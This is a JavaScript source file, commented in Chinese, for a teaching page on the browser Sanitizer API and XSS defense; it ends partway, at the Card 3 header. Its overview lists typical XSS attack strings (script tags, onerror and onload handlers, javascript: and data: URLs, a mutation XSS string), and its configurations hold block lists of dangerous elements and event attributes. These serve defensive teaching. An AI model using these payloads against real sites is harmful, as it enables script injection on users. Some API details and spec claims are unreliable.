// =====================================================================
// SanitizerAPIPage.js —— Sanitizer API HTML 净化完整实验室
// 演示 MDN / W3C Sanitizer API：浏览器原生 HTML 净化能力
//   1. 概述与动机 —— XSS 防御痛点 / 第三方库 DOMPurify 局限 /
//      Sanitizer API 标准 / 浏览器支持（Chrome 实验 / Firefox Safari 未实现）
//   2. Sanitizer 构造与配置 —— new Sanitizer() / 配置选项
//      （allowElements, blockElements, dropElements, allowAttributes,
//       dropAttributes, allowComments, allowCustomElements, excludeAttributes,
//       excludeElements, keepBodyStructure）/ 默认安全配置 / getConfiguration()
//   3. sanitizeFor 静态方法 —— Sanitizer.sanitizeFor(tag, htmlString) /
//      返回 Element / 自动选择 default sanitize mode / 与 setHTML 配合
//   4. setHTML 实例方法 —— element.setHTML(htmlString, { sanitizer }) /
//      vs innerHTML / 解析 + 净化一步到位 / 浏览器内部走 Sanitizer default
//   5. allowElements / blockElements / dropElements —— 三者优先级与差异 /
//      allowElements 仅保留指定 / blockElements 删除元素保留子节点 /
//      dropElements 元素和子节点一起删除 / 默认内置 baseline 配置
//   6. allowAttributes / dropAttributes —— 通配符匹配 * / 命名空间属性
//      （xlink:href, xml:lang, xml:base）/ 元素特定属性限定（{ '*': ['href'] }）/
//      默认属性白名单（class, id, href, src, alt 等基础属性）
//   7. 实战：用户评论净化 —— 防止 <script>, on* 事件, javascript: URL /
//      <iframe>, <object>, <embed>, <base>, <form> / data: URL /
//      SVG <use> / <style> 注入 / mutation XSS 防御
//   8. 实战与陷阱 —— 与 Trusted Types 集成 / DevTools 调试 /
//      与 DOMPurify 对比（特性差异 / 性能 / API 体积）/ 兼容性降级 /
//      CSP 协同 / sanitizeFor vs setHTML 选择 / 默认配置可写性
// 说明：所有特性调用前做 typeof 能力检测，不可用时仅记日志
//       （_addLog('warn', ...)），绝不抛异常。Sanitizer API 截至 2025
//       仅 Chromium 系实验性支持（Chrome 105 引入 / 109 转为实验 flag /
//       Firefox/Safari 未实现），jsdom/Node 无此 API，所有按钮点击仅记
//       日志说明，绝不抛异常；通过手动 DOMParser + 白名单过滤实现兼容
//       降级演示（仅做教学说明，非生产可用 Sanitizer）。
// =====================================================================
import { Page } from '../../core/Component.js';
import { h, formatTime } from '../../core/utils.js';
import { Card } from '../../components/ui/Card.js';
import { Button } from '../../components/ui/Button.js';
import { Alert } from '../../components/ui/Alert.js';
import { Tag } from '../../components/ui/Tag.js';

export class SanitizerAPIPage extends Page {
  // —— 初始 state ——
  initialState() {
    return {
      logs: [],
      capsSummary: '',
      overviewInfo: '',         // Card 1：概述与动机
      ctorInfo: '',             // Card 2：Sanitizer 构造与配置
      sanitizeForInfo: '',      // Card 3：sanitizeFor 静态方法
      setHTMLInfo: '',          // Card 4：setHTML 实例方法
      elementsInfo: '',         // Card 5：allowElements/blockElements/dropElements
      attributesInfo: '',      // Card 6：allowAttributes/dropAttributes
      commentsInfo: '',         // Card 7：实战：用户评论净化
      pitfallsInfo: '',         // Card 8：实战与陷阱
      ctorResult: '',           // Card 2 真实/降级构造结果
      sanitizeForResult: '',    // Card 3 真实/降级净化结果
      setHTMLResult: '',        // Card 4 真实/降级 setHTML 结果
      elementsResult: '',       // Card 5 三种模式对比结果
      attributesResult: '',     // Card 6 属性过滤结果
      commentSanitizeResult: '', // Card 7 用户评论净化结果
      renderedCommentsHtml: '', // Card 7 净化后评论渲染 HTML
    };
  }

  // —— 生命周期 ——
  componentDidMount() {
    // ★★★ 关键守卫：必须存在！否则 setState => rerender => componentDidMount 死循环导致 OOM
    if (this._inited) return;
    this._inited = true;

    this._dynamicStyles = [];
    // Sanitizer 实例引用（销毁时无需特别释放，GC 即可）
    this._sanitizer = null;

    const f = this._flags();
    const c = (ok) => ok ? '✓' : '✗';
    const parts = [
      `Sanitizer ${c(f.sanitizer)}`,
      `sanitizeFor(静态) ${c(f.sanitizeForStatic)}`,
      `prototype.sanitize ${c(f.sanitizeInstance)}`,
      `setHTML ${c(f.setHTML)}`,
      `getConfiguration ${c(f.getConfiguration)}`,
      `TrustedTypes ${c(f.trustedTypes)}`,
      `DOMParser ${c(f.domParser)}`,
    ];

    const any = f.sanitizer;
    const summary = any
      ? `Sanitizer API 能力检测：${parts.join(' · ')}。当前环境支持 Sanitizer（Chromium 实验 API），可真实运行 new Sanitizer() / sanitizeFor / setHTML 演示；Firefox/Safari/jsdom 暂不支持。`
      : `Sanitizer API 能力检测：${parts.join(' · ')}。Sanitizer API 截至 2025 仅 Chromium 系实验性支持（Chrome 105+ 引入，109 转实验 flag，Firefox/Safari 未实现），jsdom/Node 无此 API。所有按钮点击将仅记日志说明，绝不抛异常；本页提供手动 DOMParser + 白名单兼容降级演示（仅教学，非生产可用 Sanitizer）。`;

    this.setState({ capsSummary: summary });
    this._addLog(any ? 'info' : 'warn', `能力检测：${parts.join('，')}`);
    if (!f.sanitizer) {
      this._addLog('warn', 'Sanitizer 不可用（Chrome 105+ 实验性 API，需 chrome://flags#enable-experimental-web-platform-features 或 origin trial，Firefox/Safari/jsdom/Node 均无）');
    }
    if (!f.sanitizeForStatic) {
      this._addLog('warn', 'Sanitizer.sanitizeFor 静态方法不可用（与 Sanitizer 同期实验性支持）');
    }
    if (!f.setHTML) {
      this._addLog('warn', 'Element.setHTML 不可用（与 Sanitizer 同期实验性支持；替代方案为 innerHTML + 手动净化或 DOMPurify）');
    }
    if (!f.trustedTypes) {
      this._addLog('warn', 'Trusted Types 不可用（Chrome 83+ 支持，Firefox/Safari 部分支持，jsdom 无；与 Sanitizer 协同需 require-trusted-types-for directive）');
    }
    if (f.domParser) {
      this._addLog('info', 'DOMParser 可用，降级演示将基于 DOMParser + 白名单过滤实现');
    } else {
      this._addLog('warn', 'DOMParser 不可用，降级演示将仅展示文本说明');
    }

    this._injectBaseStyles();
  }

  componentWillUnmount() {
    // 释放 Sanitizer 实例（无显式 destroy API，仅解除引用让 GC 回收）
    this._sanitizer = null;
    // 移除动态注入的样式
    for (const style of this._dynamicStyles) {
      try { style.parentNode && style.parentNode.removeChild(style); } catch { /* noop */ }
    }
    this._dynamicStyles = [];
  }

  // —— 辅助方法 ——

  _addLog(type, content) {
    this.setState({ logs: [...this.state.logs, { type, content, time: formatTime() }].slice(-40) });
  }

  _btn(label, opts) {
    const btn = new Button({ ...opts, children: label, onClick: opts.onClick });
    this.registerChild(btn);
    return btn.render();
  }

  _caps(items) {
    return items.map(([label, ok]) =>
      h(Tag, { color: ok ? 'success' : 'error' }, `${label} ${ok ? '✓' : '✗'}`));
  }

  _injectStyle(id, css) {
    const existing = document.getElementById(id);
    if (existing) existing.remove();
    const style = document.createElement('style');
    style.id = id;
    style.textContent = css;
    document.head.appendChild(style);
    this._dynamicStyles.push(style);
  }

  // 返回布尔能力对象（供 capsSummary / 按钮 disabled 使用）
  _flags() {
    const safe = (fn) => {
      try { return fn(); } catch { return false; }
    };
    return {
      sanitizer: safe(() => typeof window.Sanitizer === 'function'),
      sanitizeForStatic: safe(() => typeof window.Sanitizer === 'function' && typeof window.Sanitizer.sanitizeFor === 'function'),
      sanitizeInstance: safe(() => typeof window.Sanitizer === 'function' && typeof window.Sanitizer.prototype.sanitize === 'function'),
      setHTML: safe(() => typeof HTMLElement !== 'undefined' && typeof HTMLElement.prototype.setHTML === 'function'),
      getConfiguration: safe(() => typeof window.Sanitizer === 'function' && typeof window.Sanitizer.prototype.getConfiguration === 'function'),
      trustedTypes: safe(() => typeof window.trustedTypes !== 'undefined'),
      domParser: safe(() => typeof window.DOMParser === 'function'),
    };
  }

  _injectBaseStyles() {
    this._injectStyle('san-base', `
      .san-demo {
        padding: 16px;
        background: #f8fafc;
        border: 1px solid #cbd5e1;
        border-radius: 8px;
        margin-top: 10px;
      }
      .san-stage {
        margin-top: 10px;
        padding: 12px;
        background: #f8fafc;
        border: 1px solid #cbd5e1;
        border-radius: 8px;
      }
      .san-output {
        background: #0f172a;
        color: #e2e8f0;
        border-radius: 4px;
        padding: 8px;
        font-family: monospace;
        font-size: 11px;
        white-space: pre-wrap;
        word-break: break-all;
        margin-top: 8px;
        min-height: 30px;
      }
      .san-output--success { background: #064e3b; color: #d1fae5; }
      .san-output--warn { background: #78350f; color: #fef3c7; }
      .san-output--danger { background: #7f1d1d; color: #fecaca; }
      .san-matrix {
        display: grid;
        grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
        gap: 8px;
        margin-top: 10px;
      }
      .san-matrix-cell {
        background: #fff;
        border: 1px solid #e2e8f0;
        border-radius: 6px;
        padding: 8px;
        font-size: 12px;
      }
      .san-matrix-title { font-weight: 600; color: #1e293b; margin-bottom: 4px; }
      .san-matrix-cell--keep { border-color: #22c55e; background: #f0fdf4; }
      .san-matrix-cell--strip { border-color: #eab308; background: #fefce8; }
      .san-matrix-cell--drop { border-color: #ef4444; background: #fef2f2; }
      .san-rendered {
        margin-top: 10px;
        padding: 12px;
        background: #fff;
        border: 1px solid #cbd5e1;
        border-radius: 6px;
        font-size: 13px;
        line-height: 1.6;
        min-height: 40px;
      }
      .san-rendered--comment {
        background: #f8fafc;
        border-color: #3b82f6;
      }
      .san-rendered b { color: #1e40af; }
      .san-rendered i { color: #6b7280; }
      .san-rendered a { color: #2563eb; text-decoration: underline; }
      .san-rendered blockquote {
        margin: 6px 0;
        padding: 6px 10px;
        border-left: 3px solid #94a3b8;
        background: #f1f5f9;
        color: #475569;
      }
      .san-rendered code {
        padding: 1px 4px;
        background: #e0e7ff;
        color: #3730a3;
        border-radius: 3px;
        font-family: monospace;
        font-size: 12px;
      }
      .san-flow {
        display: flex;
        align-items: center;
        gap: 6px;
        flex-wrap: wrap;
        margin-top: 8px;
        font-size: 12px;
      }
      .san-flow-node {
        padding: 4px 8px;
        border-radius: 6px;
        background: #e0e7ff;
        color: #1e40af;
        font-weight: 600;
      }
      .san-flow-node--danger { background: #fee2e2; color: #991b1b; }
      .san-flow-node--safe { background: #dcfce7; color: #166534; }
      .san-flow-arrow { color: #64748b; }
      .san-status {
        display: inline-block;
        padding: 2px 8px;
        border-radius: 10px;
        font-size: 11px;
        font-weight: 600;
      }
      .san-status--ok { background: #dcfce7; color: #166534; }
      .san-status--no { background: #fee2e2; color: #991b1b; }
      .san-status--warn { background: #fef3c7; color: #92400e; }
      .san-diff {
        margin-top: 10px;
        font-family: monospace;
        font-size: 11px;
      }
      .san-diff-row {
        display: grid;
        grid-template-columns: 100px 1fr;
        gap: 8px;
        padding: 4px 8px;
        border-bottom: 1px solid #e2e8f0;
      }
      .san-diff-row:last-child { border-bottom: none; }
      .san-diff-label { color: #64748b; font-weight: 600; }
      .san-diff-value { color: #1e293b; word-break: break-all; }
      .san-diff-value--removed { color: #dc2626; text-decoration: line-through; }
      .san-diff-value--kept { color: #16a34a; }
    `);
  }

  // ===================== Card 1：概述与动机 =====================

  _runOverviewDemo() {
    const f = this._flags();
    this._injectStyle('san-overview-demo', `
      .san-overview-host { padding: 12px; background: #f1f5f9; border-radius: 8px; margin-top: 10px; }
    `);
    const info = [
      '===== Sanitizer API 概述与动机 =====',
      '',
      '【XSS 防御痛点】',
      '  Cross-Site Scripting（XSS）是 Web 安全头号威胁（OWASP Top 10 常驻），',
      '  核心来源：将不可信 HTML 字符串直接写入 DOM。',
      '',
      '  常见不安全 API：',
      '  1. element.innerHTML = untrustedHtml     // 解析 HTML 全部节点，含 <script>',
      '  2. document.write(untrustedHtml)         // 整文档覆盖',
      '  3. eval / new Function(untrustedScript)  // 执行任意 JS',
      '  4. setTimeout(untrustedStr, 0)           // 字符串形式触发 eval',
      '  5. element.outerHTML = untrustedHtml     // 替换整个元素',
      '  6. document.implementation.createHTMLDocument().body.innerHTML',
      '     // 仍会解析 <script>，需手动移除',
      '',
      '  典型 XSS 攻击向量：',
      "    <script>alert('xss')</script>",
      '    <img src=x onerror=alert(1)>',
      '    <a href="javascript:alert(1)">click</a>',
      '    <svg onload=alert(1)>',
      '    <iframe src="javascript:alert(1)">',
      '    <style>@import "javascript:alert(1)";</style>',
      '    <a href="data:text/html,<script>alert(1)</script>">data url</a>',
      '    <svg><use href="data:image/svg+xml,<svg onload=alert(1)>"/></svg>',
      '    <<script>script>alert(1)</script>   // mutation XSS',
      '',
      '【传统 XSS 防御方案与局限】',
      '  方案 1：黑名单过滤（移除 <script>、on* 属性等）',
      '    ✓ 简单易用',
      '    ✗ 黑名单不全：浏览器的解析规则复杂、HTML 实体编码绕过、',
      '      mutation XSS、命名空间混淆（SVG/MathML）',
      '    ✗ 永远落后于攻击向量发现',
      '',
      '  方案 2：白名单过滤（手动正则 / 简单状态机）',
      '    ✓ 比黑名单安全',
      '    ✗ 自实现解析器易出 bug：嵌套标签、属性值转义、自闭合标签',
      '    ✗ 不能正确处理 HTML 实体（&amp; &lt; &gt; &#x27;）',
      '    ✗ 不识别模板字符串注入（template literal injection）',
      '',
      '  方案 3：DOMPurify（业界事实标准）',
      '    ✓ 经过长期攻防验证、单元测试充分',
      '    ✓ 配置灵活（ALLOWED_TAGS / ALLOWED_ATTR / FORBID_TAGS）',
      '    ✓ 支持 Trusted Types / RETURN_DOM / RETURN_DOM_FRAGMENT',
      '    ✗ 库体积 ~21KB minified + ~7KB gzipped',
      '    ✗ 解析依赖浏览器 DOMParser，与运行时上下文耦合',
      '    ✗ 仍需手动调用：el.innerHTML = DOMPurify.sanitize(html)',
      '',
      '  方案 4：Trusted Types（CSP require-trusted-types-for）',
      '    ✓ 强制所有 sink（innerHTML / eval / document.write）只接受 TrustedHTML',
      '    ✓ 编译期消除 XSS sink',
      '    ✗ 不净化 HTML，只约束写入路径',
      '    ✗ 需配合 Sanitizer / DOMPurify 提供 createHTML policy',
      '',
      '【Sanitizer API：浏览器原生 HTML 净化】',
      '  W3C Web Application Security Working Group 提议标准（Spec 状态：Draft）',
      '  设计目标：将 HTML 净化下沉到浏览器内核，替代 DOMPurify',
      '',
      '  核心三件套：',
      '  1. new Sanitizer(config)',
      '     创建带配置的 Sanitizer 实例。config 指定 allowElements/blockElements',
      '     等白名单/黑名单/属性规则。',
      '  2. element.setHTML(htmlString, { sanitizer })',
      '     原生方法：解析 + 净化 + 写入 DOM 一步到位，替代 innerHTML。',
      '     浏览器内部完成 HTML 解析（用浏览器自身的 HTML parser），',
      '     净化（按 sanitizer 配置移除危险节点），赋值（避免双重解析开销）。',
      '  3. Sanitizer.sanitizeFor(tag, htmlString)',
      '     静态方法：净化一段 HTML，返回指定 tag 的 Element（无 sanitizer 配置时',
      '     使用 default sanitize mode）。常用于：先净化得到 Element，再插入到',
      '     DOM 树的任意位置（appendChild / insertBefore）。',
      '',
      '  优势：',
      '  ✓ 浏览器原生：无 JS 库体积开销，~0KB',
      '  ✓ 与浏览器 HTML parser 同源：解析与运行时完全一致，避免 mutation XSS',
      '  ✓ default sanitize mode：内置安全基线配置（白名单 + 危险属性过滤）',
      '  ✓ 性能：C++ 原生实现，比 DOMPurify 的 JS 实现 + DOMParser 快',
      '  ✓ 与 Trusted Types 协同：setHTML 是天然 TrustedHTML sink',
      '  ✓ 与 CSP 协同：可声明只允许 setHTML / 禁用 innerHTML',
      '',
      '【浏览器支持（截至 2025）】',
      '  Chrome：    实验性（105 引入 / 109 转实验 flag / 仍非默认）',
      '              需 chrome://flags#enable-experimental-web-platform-features',
      '              或 origin trial 启用',
      '  Edge：      同 Chromium 内核，跟随 Chrome',
      '  Firefox：   ✗ 未实现（Bugzilla 长期讨论，未排期）',
      '  Safari：    ✗ 未实现（WebKit 未公开路线图）',
      '  Node.js：   ✗ 无（Node 无 DOM，需 jsdom 但 jsdom 未实现 Sanitizer）',
      '  jsdom：     ✗ 无（本页所有检测为 false）',
      '',
      '  说明：Sanitizer API 当前处于 W3C Draft 阶段，API 形态仍在迭代',
      '  （早期 Sanitizer.prototype.sanitize(input, { }) 已被 setHTML + sanitizeFor 取代）。',
      '  生产环境必须 Polyfill（基于 DOMPurify 包一层 setHTML + sanitizeFor 适配器）。',
      '',
      '【Sanitizer API vs DOMPurify vs Trusted Types 决策】',
      '  维度          Sanitizer API          DOMPurify            Trusted Types',
      '  ----------------------------------------------------------------------',
      '  实现层级       浏览器原生 C++          JS 库（基于 DOMParser）  CSP 策略层',
      '  体积           0KB                    ~21KB minified       0KB',
      '  净化能力       ✓                      ✓                    ✗（仅约束 sink）',
      '  默认安全       ✓ default sanitize     需手动配置           ✓ require 全 sink',
      '  API            setHTML + sanitizeFor  sanitize(html, cfg) policy.createHTML',
      '  浏览器支持     Chrome 实验            全平台稳定           Chrome/Firefox 部分稳定',
      '  生产可用       ✗（需 Polyfill）        ✓                    ✓（部分浏览器）',
      '  与 CSP 协同    ✓                      ✓（被 CSP 允许）       ✓（自身即 CSP）',
      '',
      '【能力检测代码】',
      "  // 一次性检测本页涉及的全部底层 API",
      "  const hasSanitizer = typeof Sanitizer === 'function';",
      "  const hasSanitizeFor = hasSanitizer && typeof Sanitizer.sanitizeFor === 'function';",
      "  const hasSetHTML = typeof HTMLElement !== 'undefined' &&",
      "                     typeof HTMLElement.prototype.setHTML === 'function';",
      "  const hasTrustedTypes = typeof trustedTypes !== 'undefined';",
      '',
      '【实际能力检测演示】',
      `  Sanitizer: ${f.sanitizer ? '✓' : '✗'}`,
      `  Sanitizer.sanitizeFor (静态): ${f.sanitizeForStatic ? '✓' : '✗'}`,
      `  Sanitizer.prototype.sanitize (实例): ${f.sanitizeInstance ? '✓' : '✗'}`,
      `  Element.setHTML: ${f.setHTML ? '✓' : '✗'}`,
      `  Sanitizer.prototype.getConfiguration: ${f.getConfiguration ? '✓' : '✗'}`,
      `  Trusted Types: ${f.trustedTypes ? '✓' : '✗'}`,
      `  DOMParser (降级用): ${f.domParser ? '✓' : '✗'}`,
      '',
      '【常见陷阱】',
      '  1. Sanitizer API 当前非默认开启，生产环境必须 Polyfill 降级到 DOMPurify',
      '  2. 早期 spec 的 sanitize(input) 实例方法已被 setHTML + sanitizeFor 取代',
      '  3. setHTML 替代的是 innerHTML，不替代 textContent（纯文本场景用 textContent）',
      '  4. default sanitize mode 不允许 <script>、on*、javascript: URL，但允许 <style>',
      '     （<style> 内 CSS 注入仍需注意 @import / expression 等老式攻击）',
      '  5. allowElements 仅保留指定元素，dropElements 是删除指定元素及其子节点',
      '     两者行为差异大，混用易出 bug',
      '  6. getConfiguration 返回的配置不可直接修改，每次 new Sanitizer 都是新实例',
      '',
    ].join('\n');
    this.setState({ overviewInfo: info });
    this._addLog('info', 'Card 1：概述与动机演示已加载');
  }

  _renderCard1() {
    const s = this.state;
    const f = this._flags();
    const card = new Card({
      title: '1. 概述与动机 —— XSS 防御痛点 / DOMPurify 局限 / Sanitizer API 标准',
      extra: h('div', { class: 'flex gap-xs' },
        ...this._caps([
          ['Sanitizer', f.sanitizer],
          ['setHTML', f.setHTML],
          ['TrustedTypes', f.trustedTypes],
        ]),
        h(Tag, { color: 'primary' }, '概述'),
      ),
      children: [
        h('p', { class: 'fs-sm text-secondary' },
          'XSS 是 Web 安全头号威胁，传统防御方案（黑名单 / 手动正则 / DOMPurify）各有局限：黑名单不全、自实现解析器易出 bug、DOMPurify 体积 21KB 仍需手动调用。Sanitizer API 是 W3C 提议的浏览器原生 HTML 净化标准，将净化下沉到浏览器内核，配合 setHTML + sanitizeFor 替代 innerHTML。截至 2025 仅 Chrome 实验性支持（需 flag 或 origin trial），Firefox/Safari 未实现，jsdom 无此 API。',
        ),
        h('div', { class: 'flex items-center gap-sm flex-wrap' },
          this._btn('运行概述演示', { type: 'primary', size: 'sm', onClick: () => this._runOverviewDemo() }),
        ),
        h('div', { class: 'fs-sm text-secondary' }, '代码示例：'),
        h('pre', { class: 'code-block', style: { maxHeight: '500px', overflow: 'auto' } },
          h('code', {}, `// Sanitizer API 三件套
// 1. 创建带配置的 Sanitizer
const sanitizer = new Sanitizer({
  allowElements: ['div', 'p', 'b', 'i', 'a', 'img'],
  allowAttributes: { '*': ['class'], 'a': ['href'] },
  dropElements: ['script', 'iframe', 'object'],
});

// 2. setHTML：替代 innerHTML，解析+净化+赋值一步到位
const container = document.querySelector('#comment');
container.setHTML(userInputHtml, { sanitizer });

// 3. sanitizeFor 静态方法：返回净化后的 Element
const cleanNode = Sanitizer.sanitizeFor('div', userInputHtml);
document.body.appendChild(cleanNode);  // 安全插入

// 4. default sanitize mode：不传 config 用浏览器内置安全配置
const defaultSan = new Sanitizer();
el.setHTML(html);  // 等价于 el.setHTML(html, { sanitizer: new Sanitizer() })`)),
        h('div', { class: 'fs-sm text-secondary' }, '演示结果：'),
        h('pre', { class: 'code-block', style: { maxHeight: '500px', overflow: 'auto' } },
          h('code', {}, s.overviewInfo || '（点击按钮查看 Sanitizer API 概述完整说明）')),
      ],
    });
    this.registerChild(card);
    return card.render();
  }

  // ===================== Card 2：Sanitizer 构造与配置 =====================

  _runCtorDemo() {
    const f = this._flags();
    this._injectStyle('san-ctor-demo', `
      .san-ctor-host { padding: 12px; background: #f1f5f9; border-radius: 8px; margin-top: 10px; }
    `);

    let resultLines = [];
    let sanitizeResult = '';

    if (!f.sanitizer) {
      // 降级：手动构造等价配置对象，仅做教学说明
      resultLines = [
        '===== Sanitizer 构造（降级演示）=====',
        '',
        '⚠ 当前环境 Sanitizer 不可用，以下为配置对象教学说明（手动构造）',
        '',
        '【默认配置（new Sanitizer()）】',
        '  const sanitizer = new Sanitizer();',
        '  const config = sanitizer.getConfiguration();',
        '  // config 是 SanitizerConfig 对象，包含浏览器内置 baseline：',
        '  //   allowElements:     [div, p, span, b, i, em, strong, code, pre,',
        '  //                       blockquote, ul, ol, li, h1-h6, a, img, ...]',
        '  //   blockElements:    [script, iframe, object, embed, base, form,',
        '  //                       frame, frameset, noscript, noembed, ...]',
        '  //   allowAttributes:  { "*": [class, id, dir, lang],',
        '  //                       a: [href, name, target, rel],',
        '  //                       img: [src, alt, width, height] }',
        '  //   dropAttributes:   { "*": [on*, style, srcset] }  // 通配符匹配',
        '  //   allowComments:    false',
        '  //   allowCustomElements: false',
        '',
        '【自定义配置示例】',
        '  const sanitizer = new Sanitizer({',
        '    // 仅允许这些元素，其他全部移除（元素本身删除，子节点保留）',
        "    allowElements: ['div', 'p', 'b', 'i', 'em', 'strong', 'a', 'code'],",
        '    // 强制删除这些元素及其子节点',
        "    dropElements: ['script', 'iframe', 'object', 'embed', 'style'],",
        '    // 元素特定属性：仅 a 元素允许 href，img 允许 src/alt',
        '    allowAttributes: {',
        "      '*': ['class'],          // 所有元素允许 class",
        "      'a':  ['href', 'title'],  // 仅 a 元素允许 href",
        "      'img': ['src', 'alt'],    // 仅 img 元素允许 src",
        '    },',
        '    // 通配符：所有元素移除所有 on* 事件属性（更精确用 on*）',
        "    dropAttributes: { '*': ['on*'] },",
        '    // 是否保留 HTML 注释',
        '    allowComments: false,',
        '    // 是否保留自定义元素（<my-component>）',
        '    allowCustomElements: false,',
        '  });',
        '',
        '  const config = sanitizer.getConfiguration();',
        '  console.log(config);',
        '',
        '【配置字段全集（spec 定义）】',
        '  allowElements:      Array<string>  仅保留指定元素，其他全部移除（元素本身',
        '                                    移除，子节点提升到父级）',
        '  blockElements:      Array<string>  删除指定元素，但保留其子节点',
        '  dropElements:       Array<string>  删除指定元素及其全部子节点',
        '  allowAttributes:    Record<string, string[]>  元素特定属性白名单',
        '                                    key 为元素名或 * 通配符',
        '  dropAttributes:     Record<string, string[]>  元素特定属性黑名单',
        '  allowComments:      boolean        是否保留 HTML 注释（默认 false）',
        '  allowCustomElements: boolean       是否保留 <my-component> 等（默认 false）',
        '',
        '【三组「元素级」规则优先级（spec 规定）】',
        '  优先级从高到低：',
        '    1. dropElements  （最高：直接删除元素和子节点，无视 allow）',
        '    2. allowElements （白名单：仅保留指定元素，其他移除但子节点保留）',
        '    3. blockElements （删除元素本身，保留子节点提升）',
        '  即：dropElements > allowElements > blockElements',
        '',
        '  dropElements 始终生效：即使 allowElements 包含某元素，dropElements 仍删除它',
        '',
        '【三组「属性级」规则优先级】',
        '  优先级从高到低：',
        '    1. dropAttributes  （删除指定属性）',
        '    2. allowAttributes  （白名单：仅保留指定属性）',
        '  即：dropAttributes > allowAttributes',
        '',
        '  dropAttributes 始终生效：即使 allowAttributes 包含某属性，dropAttributes 仍删除它',
        '',
        '【默认配置 vs 自定义配置对比】',
        '  默认 new Sanitizer()：',
        '    - 白名单宽松：保留所有常见安全元素（含 <style>）',
        '    - 属性宽松：保留 class/id/style 等',
        '    - 仍移除：script, on*, javascript: URL, iframe',
        '  自定义 new Sanitizer({ allowElements: [...] })：',
        '    - 白名单严格：仅保留指定元素',
        '    - 适合场景：评论区（仅 b/i/a/code）、邮件预览（限制更严）',
        '',
        '【实际能力检测结果】',
        `  Sanitizer: ${f.sanitizer ? '✓（可真实构造）' : '✗（不可用，降级演示）'}`,
        `  getConfiguration: ${f.getConfiguration ? '✓（可读取配置）' : '✗（不可用）'}`,
        '',
        '【常见陷阱】',
        '  1. allowElements 与 blockElements 不能同时包含同一元素（行为未定义）',
        '  2. dropElements 与 allowElements 冲突时，dropElements 优先（元素被删除）',
        '  3. 属性通配符 on* 仅匹配 on* 开头的属性，不匹配 handler 等',
        '  4. allowComments: true 时仍可能引入问题：IE 条件注释 / XML 注释中的 CDATA',
        '  5. allowCustomElements: true 时，自定义元素的属性仍受 allowAttributes 约束',
        '',
      ];
      sanitizeResult = 'Sanitizer 不可用（jsdom/Node 无此 API，Chrome 105+ 实验性支持）\n以上为配置对象教学说明，真实 Chrome 实验环境可运行 new Sanitizer()';
      this._addLog('warn', 'Sanitizer 不可用，仅展示配置对象教学说明（jsdom/Node 无此 API）');
    } else {
      // 真实构造
      try {
        const defaultSan = new Sanitizer();
        const defaultConfig = f.getConfiguration ? defaultSan.getConfiguration() : { _note: 'getConfiguration 不可用' };
        const customSan = new Sanitizer({
          allowElements: ['div', 'p', 'b', 'i', 'a', 'code'],
          dropElements: ['script', 'iframe', 'style'],
          allowAttributes: { '*': ['class'], a: ['href'], img: ['src', 'alt'] },
          dropAttributes: { '*': ['on*'] },
          allowComments: false,
          allowCustomElements: false,
        });
        const customConfig = f.getConfiguration ? customSan.getConfiguration() : { _note: 'getConfiguration 不可用' };
        this._sanitizer = customSan;
        resultLines = [
          '===== Sanitizer 构造（真实运行）=====',
          '',
          '✓ 当前环境支持 Sanitizer，已真实构造实例',
          '',
          '【默认配置（new Sanitizer()）】',
          JSON.stringify(defaultConfig, null, 2),
          '',
          '【自定义配置（new Sanitizer({...})）】',
          JSON.stringify(customConfig, null, 2),
          '',
          '【说明】',
          '  - allowElements: 白名单，仅保留指定元素',
          '  - dropElements: 黑名单，删除元素及其子节点',
          '  - allowAttributes: 元素特定属性白名单，* 为通配符',
          '  - dropAttributes: 元素特定属性黑名单',
          '  - allowComments: false 表示移除 HTML 注释',
          '  - allowCustomElements: false 表示移除自定义元素',
          '',
        ];
        sanitizeResult = 'Sanitizer 实例创建成功，配置如上';
        this._addLog('info', 'Sanitizer 实例创建成功');
      } catch (err) {
        resultLines = [
          '===== Sanitizer 构造失败 =====',
          '',
          `错误：${err.name} - ${err.message}`,
          '',
          '可能原因：',
          '  1. 配置对象字段拼写错误（spec 变更）',
          '  2. 当前 Chrome 实验版本 Sanitizer spec 未对齐',
          '  3. allowElements/blockElements 同时包含同元素',
          '',
        ];
        sanitizeResult = `构造失败：${err.name} - ${err.message}`;
        this._addLog('error', `Sanitizer 构造失败：${err.name} - ${err.message}`);
      }
    }

    this.setState({
      ctorInfo: resultLines.join('\n'),
      ctorResult: sanitizeResult,
    });
  }

  _renderCard2() {
    const s = this.state;
    const f = this._flags();
    const card = new Card({
      title: '2. Sanitizer 构造与配置 —— new Sanitizer() / 配置选项 / 默认安全配置',
      extra: h('div', { class: 'flex gap-xs' },
        ...this._caps([
          ['Sanitizer', f.sanitizer],
          ['getConfiguration', f.getConfiguration],
        ]),
        h(Tag, { color: 'primary' }, '构造'),
      ),
      children: [
        h('p', { class: 'fs-sm text-secondary' },
          'new Sanitizer(config) 创建带配置的净化器实例。config 支持 allowElements / blockElements / dropElements（元素白/黑名单）/ allowAttributes / dropAttributes（属性白/黑名单）/ allowComments / allowCustomElements。getConfiguration() 返回当前实例的配置快照（不可变）。默认配置（new Sanitizer()）内置安全 baseline：白名单宽松但移除 script/iframe/on*，仍保留 <style>。',
        ),
        h('div', { class: 'flex items-center gap-sm flex-wrap' },
          this._btn('运行构造演示', { type: 'primary', size: 'sm', onClick: () => this._runCtorDemo() }),
        ),
        h('div', { class: 'fs-sm text-secondary' }, '代码示例：'),
        h('pre', { class: 'code-block', style: { maxHeight: '500px', overflow: 'auto' } },
          h('code', {}, `// 默认配置
const defaultSan = new Sanitizer();
const defaultConfig = defaultSan.getConfiguration();
// 浏览器内置 baseline：保留常见安全元素，移除 script/iframe/on*

// 自定义配置
const sanitizer = new Sanitizer({
  allowElements: ['div', 'p', 'b', 'i', 'em', 'strong', 'a', 'code'],
  dropElements: ['script', 'iframe', 'object', 'embed', 'style'],
  allowAttributes: {
    '*':   ['class'],          // 所有元素允许 class
    'a':   ['href', 'title'],
    'img': ['src', 'alt'],
  },
  dropAttributes: { '*': ['on*'] },  // 通配符移除所有 on* 事件
  allowComments: false,
  allowCustomElements: false,
});

const config = sanitizer.getConfiguration();
console.log(config.allowElements);   // ['div', 'p', 'b', 'i', ...]`)),
        h('div', { class: 'fs-sm text-secondary' }, '构造结果：'),
        h('pre', { class: 'code-block', style: { maxHeight: '500px', overflow: 'auto' } },
          h('code', {}, s.ctorInfo || '（点击按钮查看 Sanitizer 构造与配置完整说明）')),
        s.ctorResult ? h('div', { class: 'san-output san-output--success' }, s.ctorResult) : null,
      ],
    });
    this.registerChild(card);
    return card.render();
  }

  // ===================== Card 3：sanitizeFor 静态方法 =====================

